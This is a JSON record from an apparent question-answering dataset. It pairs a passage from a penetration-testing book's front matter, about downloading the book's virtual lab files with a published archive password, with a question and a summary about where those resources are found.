    "text": "800.420.7240 or sales@nostarch.com\n\n415.863.9900 web:\nwww.nostarch.com\nDownloading the Software to Build Your Virtual Lab\nYou’ll find links for the resources used in this book at http://www.nostarch.com/\npentesting/, including the custom web application, the Ubuntu target, and\nthe Kali Linux virtual machine. Use the password 1stPentestBook?! to open the\n7-Zip archive containing the book’s resources.\nYou can find 7-Zip programs for Windows and Linux platforms at http://\nwww.7-zip.org/download.html. Mac users can use Ez7z from http://ez7z .en.softonic\n.com/mac/.\nIf you’re unable to download the files or you’d just like them delivered\nto your doorstep, we’ll send you a DVD containing the files for US $10.\nVisit http://www.nostarch.com/pentesting/ for details.\nYou’ll find additional resources at Georgia Weidman’s website: http://\nbulbsecurity.com/.",
    "question": "Where can I find the resources for the book, including the custom web application, Ubuntu target, and Kali Linux virtual machine?",
    "summary": "The book provides links to download resources like a custom web application, Ubuntu target, and Kali Linux VM using the password 1stPentestBook?! or via a DVD for $10. Resources can be found at www.nostarch.com/pentesting/ and additional materials are available on Georgia Weidman’s website at bulbsecurity.com. 7-Zip is needed to access the downloaded files, and download links are provided for Windows, Linux, and Mac users."
  }
]